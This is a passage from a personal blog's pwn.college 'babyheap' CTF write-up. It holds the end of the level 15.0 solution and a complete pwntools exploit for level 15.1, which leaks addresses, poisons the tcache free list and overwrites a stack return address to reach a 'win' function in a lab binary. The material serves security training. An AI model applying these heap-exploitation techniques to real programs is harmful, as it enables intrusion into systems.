</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read(p, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(stack_ret_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read(p, <span style="color:#ae81ff">4</span>, p64(data_base_addr <span style="color:#f92672">+</span> win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-151">level 15.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">quit</span>(p):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">echo</span>(p, index, offset):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Offset: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(offset)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;read&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(len(payload))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./babyheap_level15.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_arena_96 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebbe0</span>
</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ef2e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bin_echo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2110</span>
</span></span><span style="display:flex;"><span>win_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#target_stack = 0x7fff4f09a332</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#stack_base = 0x7fff4f09a432</span>
</span></span><span style="display:flex;"><span>stack_ret_addr_leak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc015700e8</span>
</span></span><span style="display:flex;"><span>stack_leak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffc0156ff72</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data_bin_echo <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>data_base_addr <span style="color:#f92672">=</span> data_bin_echo <span style="color:#f92672">-</span> bin_echo
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] data_base_addr:&#39;</span>, hex(data_base_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stack_local <span style="color:#f92672">=</span> u64(echo(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x38</span>)<span style="color:#f92672">.</span>strip() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>stack_ret_addr <span style="color:#f92672">=</span> stack_local <span style="color:#f92672">-</span> stack_leak <span style="color:#f92672">+</span> stack_ret_addr_leak
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] stack_local:&#39;</span>, hex(stack_local))
</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#39;[+] stack_ret_addr:&#39;</span>, hex(stack_ret_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read(p, <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(stack_ret_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read(p, <span style="color:#ae81ff">4</span>, p64(data_base_addr <span style="color:#f92672">+</span> win_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/ctf/">CTF</a>
        
            <a href="/tags/pwn/">Pwn</a>
        
            <a href="/tags/labs/">Labs</a>
        
    </section>


    </footer>


    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/post/pwn-college-babysuid/">
        
        
            <div class="article-image">
                <img src="/post/pwn-college-babysuid/cover.81610c34538532eac1bcc922163ec93b_hu49e7daec41668e669b103e60b6fba5c9_14595991_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post pwn.college embryosuid writeups"
                        
                        data-hash="md5-gWEMNFOFMurBvMkiFj7JOw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pwn.college embryosuid writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/pwn-college-embryoasm/">
        
        
            <div class="article-image">
                <img src="/post/pwn-college-embryoasm/cover.430e17d79dca1928c343970d5adb0e3c_huc49026d0171a2bbd038c4185e9d0bdb2_523180_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post pwn.college embryoasm writeups"
                        
                        data-hash="md5-Qw4X153KGSjDQ5cNWtsOPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pwn.college embryoasm writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/pwn-college-embryoio/">
        
        
            <div class="article-image">
                <img src="/post/pwn-college-embryoio/cover.cb06cde85f64c877cddd940a28ff0e6a_hudb1b3410b7f24b071b88cd232e292e79_1180983_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post pwn.college embryoio writeups"
                        
                        data-hash="md5-ywbN6F9kyHfN3ZQKKP8Oag==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pwn.college embryoio writeups</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/csapp-labs/">
        
        
            <div class="article-image">
                <img src="/post/csapp-labs/cover.60f2c68d83d56007c5960ebcac35cd70_hu3b8d692d45d6b215e59701d25ac88074_3319905_250x150_fill_q75_box_smart1.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CSAPP Labs"
                        
                        data-hash="md5-YPLGjYPVYAfFlg68rDXNcA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CSAPP Labs</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/post/hgame2022-writeups/">
        
        
            <div class="article-image">
                <img src="/post/hgame2022-writeups/cover.45cca8b74c89d3f9ce11dd8491813b9d_hu135499abd96f0998ee1b80004657897f_2075706_250x150_fill_box_smart1_3.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HGAME2022 writeups"
                        
                        data-hash="md5-Rcyot0yJ0/nOEd2EkYE7nQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HGAME2022 writeups</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy;
        
        2023 s0uthwood&#39;s Blog
    
        
            <br />
            已运行 <i class="fas fa-bell"></i> <a id="days">0</a> 天
        
    
        
            &nbsp;&nbsp;
            
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
            
            ⌨&nbsp;
            102.46k&nbsp;
            字
            &nbsp;&nbsp;
            🧠&nbsp;
            42&nbsp;
            篇文章
        
    </section>

    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>

    
        <script>
            var s1 = "2020-11-15";
            s1 = new Date(s1.replace(/-/g, "/"));
            s2 = new Date();
            var days = s2.getTime() - s1.getTime();
            var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
            document.getElementById('days').innerHTML = number_of_days;
        </script>
    
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">Table of contents</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#level-10">level 1.0</a></li>
    <li><a href="#level-11">level 1.1</a></li>
    <li><a href="#level-20">level 2.0</a></li>
    <li><a href="#level-21">level 2.1</a></li>
    <li><a href="#level-30">level 3.0</a></li>
    <li><a href="#level-31">level 3.1</a></li>
    <li><a href="#level-40">level 4.0</a></li>
    <li><a href="#level-41">level 4.1</a></li>
    <li><a href="#level-50">level 5.0</a></li>
    <li><a href="#level-51">level 5.1</a></li>
    <li><a href="#level-60">level 6.0</a></li>
    <li><a href="#level-61">level 6.1</a></li>
    <li><a href="#level-70">level 7.0</a></li>
    <li><a href="#level-71">level 7.1</a></li>
    <li><a href="#level-80">level 8.0</a></li>
    <li><a href="#level-81">level 8.1</a></li>
    <li><a href="#level-90">level 9.0</a></li>
    <li><a href="#level-91">level 9.1</a></li>
    <li><a href="#level-100">level 10.0</a></li>
    <li><a href="#level-101">level 10.1</a></li>
    <li><a href="#level-110">level 11.0</a></li>
    <li><a href="#level-111">level 11.1</a></li>
    <li><a href="#level-120">level 12.0</a></li>
    <li><a href="#level-121">level 12.1</a></li>
    <li><a href="#level-130">level 13.0</a></li>
    <li><a href="#level-131">level 13.1</a></li>
    <li><a href="#level-140">level 14.0</a></li>
    <li><a href="#level-141">level 14.1</a></li>
    <li><a href="#level-150">level 15.0</a></li>
    <li><a href="#level-151">level 15.1</a></li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
